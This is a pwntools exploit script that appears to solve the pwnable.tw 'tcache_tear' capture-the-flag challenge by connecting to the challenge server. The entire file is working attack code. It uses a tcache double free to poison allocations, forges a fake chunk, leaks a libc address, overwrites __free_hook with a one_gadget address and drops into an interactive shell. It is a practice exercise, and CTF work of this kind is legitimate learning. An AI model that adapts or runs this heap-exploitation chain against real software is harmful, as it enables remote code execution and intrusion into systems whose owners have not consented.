from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10207
LOCAL = False
elf = ELF("./tcache_tear")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            # b *0x400C54
            # b *0x400B54
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def alloc(size, data):
    sla(b":", b"1")
    sla(b":", str(size))
    sla(b":", data)

def free():
    sla(b":", b"2")

def leak():
    sla(b":", b"3")
    ru(b":")
    r(0x10)
    return u64(r(8))

def attack(size, addr, data):
    alloc(size, b"A" * 8)
    free()
    free()
    alloc(size, p64(addr))
    alloc(size, b"A" * 8)
    alloc(size, data)

sla(b":", p64(0) + p64(0x501))
name_bss = 0x602060
# Pad for fake chunk
attack(0x70, name_bss + 0x500, (p64(0) + p64(0x21) + p64(0) * 2) * 2)
attack(0x60, name_bss + 0x10, b"\0" * 0x10)
free()

libc.address = leak() - 0x3ebca0
info("LIBC: " + hex(libc.address))
one_gadget = libc.address + 0x4f322

attack(0x80, libc.symbols["__free_hook"], p64(one_gadget))
alloc(0x20, b"PWN")
free()

p.interactive()
